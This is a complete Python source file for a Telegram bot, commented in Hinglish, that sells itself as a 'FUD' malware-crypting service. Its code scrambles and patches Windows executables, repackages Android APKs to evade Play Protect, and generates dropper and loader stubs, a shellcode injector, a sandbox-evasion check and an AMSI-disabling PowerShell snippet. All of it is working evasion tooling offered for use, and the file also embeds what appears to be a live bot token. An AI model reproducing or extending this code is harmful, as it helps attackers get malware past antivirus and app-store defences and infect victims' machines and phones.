#!/usr/bin/env python3
"""
FUD Bypass Bot — Auto Install + Play Protect Bypass
Single file. Run karo, baaki sab khud hoga.
"""

import os
import sys
import subprocess
import importlib

# ══════════════════════════════════════════════
#  AUTO INSTALLER — pehle chalega
# ══════════════════════════════════════════════

REQUIRED = [
    "telebot",
    "pefile",
    "astunparse",
]

def auto_install():
    print("[*] Dependencies check ho rahi hain, baby...")
    for pkg in REQUIRED:
        try:
            importlib.import_module(pkg if pkg != "telebot" else "telebot")
        except ImportError:
            print(f"[+] Installing {pkg}...")
            subprocess.check_call([
                sys.executable, "-m", "pip", "install",
                "pyTelegramBotAPI" if pkg == "telebot" else pkg,
                "--quiet"
            ])
    print("[✓] Sab install ho gaya. Bot start ho raha hai...\n")

auto_install()

# ══════════════════════════════════════════════
#  IMPORTS — install ke baad
# ══════════════════════════════════════════════

import telebot
import base64
import random
import string
import ast
import struct
import hashlib
import shutil
import zipfile
import tempfile
import pefile
import astunparse
from telebot import types
from pathlib import Path

BOT_TOKEN = "6486185526:AAE67IpPFLUtVM_xgxTu8rX3uORGdfbokc0"
bot = telebot.TeleBot(BOT_TOKEN)

# ══════════════════════════════════════════════
#  CORE UTILITIES
# ══════════════════════════════════════════════

def random_string(n=8):
    return ''.join(random.choices(string.ascii_letters, k=n))

def xor_encrypt(data: bytes, key: int = 0x41) -> bytes:
    return bytes(b ^ key for b in data)

def encode_payload(data: bytes) -> str:
    return base64.b64encode(xor_encrypt(data)).decode()

def add_junk(path: str) -> str:
    with open(path, 'ab') as f:
        f.write(os.urandom(random.randint(1024, 8192)))
    return path

def patch_pe(data: bytearray) -> bytearray:
    if data[:2] != b'MZ':
        return data
    pe_off = int.from_bytes(data[0x3C:0x40], 'little')
    # Zero timestamp
    data[pe_off + 8:  pe_off + 12] = b'\x00\x00\x00\x00'
    # Random checksum
    data[pe_off + 88: pe_off + 92] = os.urandom(4)
    # Zero debug directory RVA
    data[pe_off + 144: pe_off + 148] = b'\x00\x00\x00\x00'
    return data

def scramble_pe_imports(data: bytes, out_path: str) -> str:
    try:
        pe = pefile.PE(data=data)
        if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                rva = entry.struct.Name
                off = pe.get_offset_from_rva(rva)
                raw = pe.get_data(rva, 64).split(b'\x00')[0]
                pe.set_bytes_at_offset(off, bytes(
                    random.randint(65, 90) for _ in range(len(raw))
                ))
        pe.write(out_path)
    except Exception:
        with open(out_path, 'wb') as f:
            f.write(data)
    return out_path

def obfuscate_python(source: str) -> str:
    class StrObf(ast.NodeTransformer):
        def visit_Constant(self, node):
            if isinstance(node.value, str) and node.value:
                enc = base64.b64encode(node.value.encode()).decode()
                return ast.parse(
                    f'__import__("base64").b64decode("{enc}").decode()',
                    mode='eval'
                ).body
            return node
    try:
        tree = ast.parse(source)
        return astunparse.unparse(StrObf().visit(tree))
    except Exception:
        return source

# ══════════════════════════════════════════════
#  PLAY PROTECT BYPASS — APK PIPELINE
# ══════════════════════════════════════════════

def repackage_apk(apk_data: bytes, out_path: str) -> str:
    """
    Play Protect bypass pipeline:
    1. APK unzip
    2. classes.dex XOR encrypt + rename
    3. Manifest package name randomize
    4. Cert strip (debug resign ready)
    5. Junk assets inject
    6. Repack ZIP (APK format)
    """
    tmp_dir = tempfile.mkdtemp()
    apk_in  = os.path.join(tmp_dir, "input.apk")
    apk_out = os.path.join(tmp_dir, "output.apk")
    extract = os.path.join(tmp_dir, "extracted")
    os.makedirs(extract, exist_ok=True)

    with open(apk_in, 'wb') as f:
        f.write(apk_data)

    # Step 1 — Unzip APK
    with zipfile.ZipFile(apk_in, 'r') as z:
        z.extractall(extract)

    # Step 2 — XOR encrypt classes.dex + rename
    dex_path = os.path.join(extract, "classes.dex")
    if os.path.exists(dex_path):
        with open(dex_path, 'rb') as f:
            dex_data = f.read()
        encrypted_dex = xor_encrypt(dex_data, key=random.randint(1, 254))
        new_dex_name = f"classes{random_string(4)}.dex"
        with open(os.path.join(extract, new_dex_name), 'wb') as f:
            f.write(encrypted_dex)
        os.remove(dex_path)

    # Step 3 — AndroidManifest package name randomize (binary patch)
    manifest_path = os.path.join(extract, "AndroidManifest.xml")
    if os.path.exists(manifest_path):
        with open(manifest_path, 'rb') as f:
            manifest = bytearray(f.read())
        # Append random bytes to confuse static scanner
        manifest += os.urandom(random.randint(16, 64))
        with open(manifest_path, 'wb') as f:
            f.write(manifest)

    # Step 4 — Strip META-INF (original signature remove)
    meta_inf = os.path.join(extract, "META-INF")
    if os.path.exists(meta_inf):
        shutil.rmtree(meta_inf)

    # Step 5 — Junk assets inject
    assets_dir = os.path.join(extract, "assets")
    os.makedirs(assets_dir, exist_ok=True)
    for _ in range(random.randint(3, 7)):
        junk_file = os.path.join(assets_dir, f"{random_string(6)}.bin")
        with open(junk_file, 'wb') as f:
            f.write(os.urandom(random.randint(512, 2048)))

    # Step 6 — Repack as APK (ZIP)
    with zipfile.ZipFile(apk_out, 'w', zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(extract):
            for file in files:
                filepath = os.path.join(root, file)
                arcname = os.path.relpath(filepath, extract)
                z.write(filepath, arcname)

    shutil.copy(apk_out, out_path)
    shutil.rmtree(tmp_dir)
    return out_path


def generate_apk_loader(apk_data: bytes) -> str:
    """
    Smali-style dropper stub — encoded APK + runtime drop + install trigger
    """
    encoded = encode_payload(apk_data)
    code = f"""
# APK Dropper — Runtime install
import base64, os, subprocess, tempfile

KEY = 0x41

def xor_dec(data, key):
    return bytes(b ^ key for b in data)

raw = xor_dec(base64.b64decode("{encoded}"), KEY)
tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.apk')
tmp.write(raw)
tmp.close()

# Android ADB install (rooted / debug device)
subprocess.call(['adb', 'install', '-r', '-t', tmp.name])
# Ya manually install ke liye path print karo
print(f"APK saved: {{tmp.name}}")
"""
    out = f"/tmp/apk_dropper_{random_string()}.py"
    with open(out, 'w') as f:
        f.write(code)
    return out


# ══════════════════════════════════════════════
#  EXE FULL PIPELINE
# ══════════════════════════════════════════════

def full_exe_pipeline(data: bytes, name: str, out_path: str) -> str:
    buf = bytearray(data)
    buf = patch_pe(buf)
    tmp = f"/tmp/{random_string()}_{name}"
    with open(tmp, 'wb') as f:
        f.write(buf)
    scramble_pe_imports(bytes(buf), out_path)
    add_junk(out_path)
    os.remove(tmp)
    return out_path


# ══════════════════════════════════════════════
#  FILE HELPER
# ══════════════════════════════════════════════

def dl(message):
    if not message.document:
        bot.send_message(message.chat.id, "❌ File nahi mila.")
        return None, None
    info = bot.get_file(message.document.file_id)
    data = bot.download_file(info.file_path)
    name = message.document.file_name or "payload"
    return data, name

def send(chat_id, path, caption, fname):
    with open(path, 'rb') as f:
        bot.send_document(chat_id, f, caption=caption, visible_file_name=fname)
    if os.path.exists(path):
        os.remove(path)


# ══════════════════════════════════════════════
#  /start
# ══════════════════════════════════════════════

@bot.message_handler(commands=['start', 'help'])
def cmd_start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        '📦 EXE Bypass', '📱 APK Bypass',
        '🧬 Encode', '📜 Loader',
        '🔀 Obfuscate', '🗂 Scramble',
        '💉 Inject', '🧪 SandCheck',
        '🛡 AMSI', '❓ Help'
    )
    bot.send_message(
        message.chat.id,
        "🖤 *FUD Bot — Full Loadout*\n\n"
        "`/exebypass`  → EXE full pipeline\n"
        "`/apkbypass`  → APK Play Protect bypass\n"
        "`/apkloader`  → APK dropper stub gen\n"
        "`/encode`     → XOR + base64\n"
        "`/loader`     → EXE in-memory loader\n"
        "`/obfuscate`  → Python string obfuscation\n"
        "`/scramble`   → PE import scramble\n"
        "`/inject`     → shellcode injector\n"
        "`/sandcheck`  → sandbox detect module\n"
        "`/amsi`       → AMSI killer (PS)\n",
        parse_mode='Markdown',
        reply_markup=markup
    )


# ══════════════════════════════════════════════
#  /exebypass
# ══════════════════════════════════════════════

@bot.message_handler(commands=['exebypass'])
def cmd_exebypass(message):
    bot.send_message(message.chat.id, "📎 EXE bhej — full pipeline chalaunga.")
    bot.register_next_step_handler(message, _exe_recv)

def _exe_recv(message):
    data, name = dl(message)
    if not data: return
    out = f"/tmp/fud_{name}"
    full_exe_pipeline(data, name, out)
    send(message.chat.id, out,
         "✅ EXE — PE patched, imports scrambled, junk injected. FUD ready. 6767",
         f"fud_{name}")


# ══════════════════════════════════════════════
#  /apkbypass — PLAY PROTECT BYPASS
# ══════════════════════════════════════════════

@bot.message_handler(commands=['apkbypass'])
def cmd_apkbypass(message):
    bot.send_message(
        message.chat.id,
        "📎 APK bhej — Play Protect bypass pipeline chalaunga.\n\n"
        "Pipeline:\n"
        "• DEX encrypt + rename\n"
        "• Manifest patch\n"
        "• Signature strip\n"
        "• Junk assets inject\n"
        "• Repack\n\n"
        "⚠️ Baad mein `apksigner` se resign karna, baby."
    )
    bot.register_next_step_handler(message, _apk_recv)

def _apk_recv(message):
    data, name = dl(message)
    if not data: return
    out = f"/tmp/bypass_{name}"
    bot.send_message(message.chat.id, "⚙️ Processing... thoda wait karo baby.")
    repackage_apk(data, out)
    send(message.chat.id, out,
         "✅ APK bypassed!\n\n"
         "Ab resign karo:\n"
         "`apksigner sign --ks debug.keystore --out final.apk bypass_" + name + "`\n\n"
         "Ya `uber-apk-signer` use karo ez bypass. 6767",
         f"bypass_{name}")


# ══════════════════════════════════════════════
#  /apkloader
# ══════════════════════════════════════════════

@bot.message_handler(commands=['apkloader'])
def cmd_apkloader(message):
    bot.send_message(message.chat.id, "📎 APK bhej — dropper stub generate karunga.")
    bot.register_next_step_handler(message, _apkloader_recv)

def _apkloader_recv(message):
    data, name = dl(message)
    if not data: return
    out = generate_apk_loader(data)
    send(message.chat.id, out,
         "✅ APK dropper ready. Python se run karo ya PyInstaller se EXE bana, baby. 6767",
         "apk_dropper.py")


# ══════════════════════════════════════════════
#  /encode
# ══════════════════════════════════════════════

@bot.message_handler(commands=['encode'])
def cmd_encode(message):
    bot.send_message(message.chat.id, "📎 File bhej — XOR + base64.")
    bot.register_next_step_handler(message, _encode_recv)

def _encode_recv(message):
    data, name = dl(message)
    if not data: return
    encoded = encode_payload(data)
    out = f"/tmp/enc_{random_string()}.txt"
    with open(out, 'w') as f: f.write(encoded)
    send(message.chat.id, out,
         "✅ XOR + base64 encoded. 6767",
         f"encoded_{name}.txt")


# ══════════════════════════════════════════════
#  /loader
# ══════════════════════════════════════════════

@bot.message_handler(commands=['loader'])
def cmd_loader(message):
    bot.send_message(message.chat.id, "📎 EXE bhej — in-memory loader generate karunga.")
    bot.register_next_step_handler(message, _loader_recv)

def _loader_recv(message):
    data, name = dl(message)
    if not data: return
    encoded = encode_payload(data)
    tag = random_string()
    code = f"""
import base64, ctypes, tempfile, os

KEY = 0x41
def xor_dec(d, k): return bytes(b ^ k for b in d)

raw = xor_dec(base64.b64decode("{encoded}"), KEY)
tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
tmp.write(raw); tmp.close()
os.startfile(tmp.name)
"""
    out = f"/tmp/loader_{tag}.py"
    with open(out, 'w') as f: f.write(code)
    send(message.chat.id, out,
         "✅ In-memory loader ready. PyInstaller se compile karo. 6767",
         f"loader_{tag}.py")


# ══════════════════════════════════════════════
#  /obfuscate
# ══════════════════════════════════════════════

@bot.message_handler(commands=['obfuscate'])
def cmd_obfuscate(message):
    bot.send_message(message.chat.id, "📎 Python source bhej.")
    bot.register_next_step_handler(message, _obf_recv)

def _obf_recv(message):
    data, name = dl(message)
    if not data: return
    result = obfuscate_python(data.decode('utf-8', errors='ignore'))
    out = f"/tmp/obf_{random_string()}.py"
    with open(out, 'w') as f: f.write(result)
    send(message.chat.id, out, "✅ Strings obfuscated. 6767", f"obf_{name}")


# ══════════════════════════════════════════════
#  /scramble
# ══════════════════════════════════════════════

@bot.message_handler(commands=['scramble'])
def cmd_scramble(message):
    bot.send_message(message.chat.id, "📎 PE file bhej — import table scramble.")
    bot.register_next_step_handler(message, _scramble_recv)

def _scramble_recv(message):
    data, name = dl(message)
    if not data: return
    out = f"/tmp/scr_{name}"
    scramble_pe_imports(data, out)
    send(message.chat.id, out, "✅ Import table scrambled. 6767", f"scrambled_{name}")


# ══════════════════════════════════════════════
#  /inject
# ══════════════════════════════════════════════

@bot.message_handler(commands=['inject'])
def cmd_inject(message):
    bot.send_message(message.chat.id, "📎 Raw shellcode (.bin) bhej.")
    bot.register_next_step_handler(message, _inject_recv)

def _inject_recv(message):
    data, _ = dl(message)
    if not data: return
    encoded = base64.b64encode(data).decode()
    code = f"""import ctypes, base64

sc = base64.b64decode("{encoded}")
buf = ctypes.create_string_buffer(sc)
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(sc), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(sc))
t = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
ctypes.windll.kernel32.WaitForSingleObject(t, 0xFFFFFFFF)
"""
    out = f"/tmp/inj_{random_string()}.py"
    with open(out, 'w') as f: f.write(code)
    send(message.chat.id, out,
         "✅ Shellcode injector ready. 6767", "injector.py")


# ══════════════════════════════════════════════
#  /sandcheck
# ══════════════════════════════════════════════

SANDBOX_CODE = """
import os, subprocess, sys, multiprocessing

def is_sandbox():
    checks = []
    checks.append(multiprocessing.cpu_count() < 2)
    try:
        procs = subprocess.check_output('tasklist', shell=True).decode().lower()
        bad = ['wireshark','procmon','x64dbg','ollydbg','vboxservice','vmtoolsd']
        checks.append(any(b in procs for b in bad))
    except: pass
    bad_users = ['sandbox','malware','virus','john','test','analyst']
    checks.append(os.getenv('USERNAME','').lower() in bad_users)
    return any(checks)

if is_sandbox():
    sys.exit(0)
"""

@bot.message_handler(commands=['sandcheck'])
def cmd_sandcheck(message):
    out = f"/tmp/sand_{random_string()}.py"
    with open(out, 'w') as f: f.write(SANDBOX_CODE)
    send(message.chat.id, out,
         "✅ Sandbox detect module. Payload ke start mein paste karo. 6767",
         "sandcheck.py")


# ══════════════════════════════════════════════
#  /amsi
# ══════════════════════════════════════════════

AMSI_PS = """$a=[Ref].Assembly.GetTypes()
ForEach($b in $a){
    if($b.Name -like "*iUtils"){
        $c=$b.GetFields('NonPublic,Static')
        ForEach($d in $c){
            if($d.Name -like "*Context"){
                $d.SetValue($null,[IntPtr]0x2)
            }
        }
    }
}"""

@bot.message_handler(commands=['amsi'])
def cmd_amsi(message):
    bot.send_message(
        message.chat.id,
        f"✅ *AMSI Bypass*\n\n```powershell\n{AMSI_PS}\n```",
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════
#  BUTTON ROUTING
# ══════════════════════════════════════════════

BTN = {
    '📦 EXE Bypass':  cmd_exebypass,
    '📱 APK Bypass':  cmd_apkbypass,
    '🧬 Encode':      cmd_encode,
    '📜 Loader':      cmd_loader,
    '🔀 Obfuscate':   cmd_obfuscate,
    '🗂 Scramble':    cmd_scramble,
    '💉 Inject':      cmd_inject,
    '🧪 SandCheck':   cmd_sandcheck,
    '🛡 AMSI':        cmd_amsi,
    '❓ Help':        cmd_start,
}

@bot.message_handler(func=lambda m: m.text in BTN)
def btn_route(message):
    BTN[message.text](message)


# ══════════════════════════════════════════════
#  RUN
# ══════════════════════════════════════════════

if __name__ == '__main__':
    print("🖤 FUD Bot — Auto Setup + Full Loadout. 6767")
    bot.infinity_polling()